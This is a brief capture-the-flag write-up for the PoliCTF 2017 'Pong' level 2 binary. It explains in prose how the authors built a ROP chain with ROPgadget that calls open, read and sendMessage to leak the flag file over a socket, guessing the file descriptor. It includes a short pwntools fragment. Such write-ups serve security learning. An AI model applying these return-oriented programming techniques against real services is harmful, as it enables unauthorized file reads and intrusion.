[Download](https://github.com/jbzteam/CTF/blob/master/PoliCTF2017/Pong/pong2.tgz)

It is basically the same binary as [level1](https://github.com/jbzteam/CTF/blob/master/PoliCTF2017/Pong/pong1.tgz?raw=true), but without the `secret` function. 

This time we did ROP to achieve what the removed function was offering. 

We used ROPgadget to lookup for meaningful gadgets to achieve our intent. We chained gadgets to achieve calls to `open` then `read` (both of them had a PLT entry) and finally we called `sendMessage` to have the flag content printed back to the client socket. 

Since we didn't find a proper gadget in order to prepare the correct `fd` argument for the call to `read` (specifically the one returned by `open`) we tried to guess it. 

We observed that the `fd` number was 9 on our local machine, so we tried that value on the server and it worked like a charm at the first run.

    p.sendline(level)
    p.recvuntil("OK ")
    s = p.recvline()
    c_port = int(s.strip())

    we observed that in someway ( we did not investigate on)
    the stack position where we put the
    flag string was modified corrupting 
    its value. so we add some instructions 
    to push deeper down to the stack 
    the string, so avoiding the corruption.
